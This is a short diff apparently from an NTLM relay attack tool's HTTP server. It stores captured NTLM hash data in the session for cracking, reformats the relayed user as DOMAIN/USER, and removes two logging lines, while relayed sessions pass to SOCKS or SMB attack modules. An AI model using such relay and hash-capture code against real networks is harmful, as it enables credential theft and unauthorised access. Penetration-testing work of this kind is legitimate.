@@ -154,11 +154,11 @@ class HTTPRelayServer(Thread):
                                                         authenticateMessage['user_name'],
                                                         authenticateMessage['domain_name'],
                                                         authenticateMessage['lanman'], authenticateMessage['ntlm'])
-                    logging.info(ntlm_hash_data['hash_string'])
                     if self.server.config.outputFile is not None:
                         writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.config.outputFile)
                     self.server.config.target.log_target(self.client_address[0],self.target)
 
+                    self.client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data
                     self.do_attack( {'CHALLENGE_MESSAGE': self.challengeMessage} )
                     # And answer 404 not found
                     self.send_response(404)
@@ -183,7 +183,7 @@ class HTTPRelayServer(Thread):
 
         def do_ntlm_auth(self,token,authenticateMessage):
             #For some attacks it is important to know the authenticated username, so we store it
-            self.authUser = authenticateMessage['user_name']
+            self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'), authenticateMessage['user_name'].decode('utf-16le'))).upper()
 
             if authenticateMessage['user_name'] != '' or self.target[1] == '127.0.0.1':
                 clientResponse, errorCode = self.client.sendAuth(token)
@@ -203,7 +203,6 @@ class HTTPRelayServer(Thread):
                     # For now, we only support SOCKS for SMB and MSSQL, for now.
                     # Pass all the data to the socksplugins proxy
                     activeConnections.put((self.target[1], self.client.targetPort, self.authUser, self.client.session, self.client.sessionData))
-                    logging.info("Adding %s(%s) to active SOCKS connection. Enjoy" % (self.target[1], self.client.targetPort))
                 else:
                     clientThread = self.server.config.attacks['SMB'](self.server.config, self.client.session, self.authUser)
                     clientThread.start()
